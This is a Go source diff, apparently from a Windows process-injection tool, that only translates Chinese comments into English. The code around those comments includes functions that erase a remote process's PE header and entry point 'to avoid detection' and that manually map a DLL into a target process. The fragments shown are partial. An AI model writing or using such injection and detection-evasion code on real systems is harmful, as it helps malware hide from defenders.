@@ -7,13 +7,13 @@ import (
 	"golang.org/x/sys/windows"
 )
 
-// ErasePEHeader 擦除PE头以避免检测
+// ErasePEHeader erases PE header to avoid detection
 func ErasePEHeader(processHandle windows.Handle, baseAddress uintptr) error {
-	// 擦除PE头，通常是将PE头的前4KB内存填充为0
+	// Erase PE header, usually fill the first 4KB of PE header memory with zeros
 	var bytesWritten uintptr
-	zeroBuffer := make([]byte, 4096) // 4KB的零填充
+	zeroBuffer := make([]byte, 4096) // 4KB zero fill
 
-	// 写入零填充到PE头
+	// Write zero fill to PE header
 	err := WriteProcessMemory(processHandle, baseAddress, unsafe.Pointer(&zeroBuffer[0]), uintptr(len(zeroBuffer)), &bytesWritten)
 	if err != nil {
 		return fmt.Errorf("Failed to erase PE header: %v", err)
@@ -22,7 +22,7 @@ func ErasePEHeader(processHandle windows.Handle, baseAddress uintptr) error {
 	return nil
 }
 
-// EraseEntryPoint 擦除入口点以避免检测
+// EraseEntryPoint erases entry point to avoid detection
 func EraseEntryPoint(processHandle windows.Handle, baseAddress uintptr) error {
 	// 读取PE头，找到入口点，然后用NOP指令覆盖入口点
 	// 读取DOS头和NT头，获取入口点RVA
@@ -79,7 +79,7 @@ func EraseEntryPoint(processHandle windows.Handle, baseAddress uintptr) error {
 	return nil
 }
 
-// ManualMapDLL 使用手动映射方式加载DLL
+// ManualMapDLL loads DLL using manual mapping method
 func ManualMapDLL(processID uint32, dllBytes []byte, useInvisibleMemory bool) error {
 	// 检查参数
 	if processID == 0 {
